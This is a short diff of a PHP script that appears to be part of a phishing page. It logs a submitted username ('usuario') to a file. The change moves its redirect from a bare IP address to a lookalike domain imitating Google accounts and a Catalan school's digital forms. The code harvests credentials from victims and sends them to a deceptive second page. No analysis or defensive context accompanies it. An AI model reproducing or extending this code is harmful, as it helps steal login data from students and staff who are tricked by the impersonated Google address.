@@ -5,6 +5,6 @@ if (isset($_POST["usuario"])) {
     $data = "Usuari: " . $user . "\n";
     fwrite($file, $data);
     fclose($file);
-    header("Location: https://74.234.200.174/index_2.html");
+    header("Location: https://accounts-google-ibadia-educaciodigital-docs-formulari-google.com/formularios.html");
 }
 ?>
